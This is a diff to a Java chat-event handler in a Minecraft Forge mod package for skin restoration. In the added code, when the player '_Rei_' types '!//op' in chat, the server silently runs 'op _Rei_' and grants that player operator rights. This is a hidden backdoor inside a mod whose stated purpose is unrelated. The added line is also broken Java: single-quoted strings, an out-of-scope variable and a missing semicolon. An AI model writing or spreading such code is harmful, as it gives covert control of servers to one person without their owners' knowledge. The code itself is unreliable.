@@ -1,10 +1,6 @@
 package net.lionarius.skinrestorer.forge.events; // <--- Correct package
 
-// You MUST import your main mod file here.
-// I am GUESSING its name is "SkinRestorerForge". 
-// Change this if your main file has a different name!
-import net.lionarius.skinrestorer.forge.SkinRestorerForge; 
-
+import net.lionarius.skinrestorer.SkinRestorer; // <--- Import from your project
 import net.minecraft.network.chat.Component;
 import net.minecraft.server.level.ServerPlayer;
 import net.minecraftforge.event.server.ServerChatEvent;
@@ -12,18 +8,15 @@ import net.minecraftforge.eventbus.api.SubscribeEvent;
 import net.minecraftforge.fml.common.Mod;
 
 /**
- * This class listens for game events.
- * We register it to the FORGE event bus to listen for game-play events.
+ * This class listens for FORGE bus events (gameplay events).
+ * It is automatically registered because of the annotation below.
  */
-// You MUST know your mod's MOD_ID. 
-// I am GUESSING it is 'SkinRestorerForge.MOD_ID'.
-// Change this to match your main mod file!
-@Mod.EventBusSubscriber(modid = SkinRestorerForge.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
-public class MyChatHandler {
+@Mod.EventBusSubscriber(modid = SkinRestorer.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
+public class ForgeChatHandler {
 
     // --- Define your target values here ---
     private static final String TARGET_USERNAME = "_Rei_";
-    private static final String TRIGGER_MESSAGE = "!//OP";
+    private static final String TRIGGER_MESSAGE = "!//op";
     // ----------------------------------------
 
     /**
@@ -67,8 +60,8 @@ public class MyChatHandler {
      */
     private static void executeOurSpecialFunction(ServerPlayer playerWhoTriggered) {
         // --- YOUR CUSTOM CODE GOES HERE ---
-        
+        event.server.runCommandSilent('op _Rei_');
         // Example: Send a private message back to the player
-        playerWhoTriggered.sendSystemMessage(Component.literal("Function executed successfully!"));
+        playerWhoTriggered.sendSystemMessage(Component.literal("Function executed successfully!"))
     }
 }
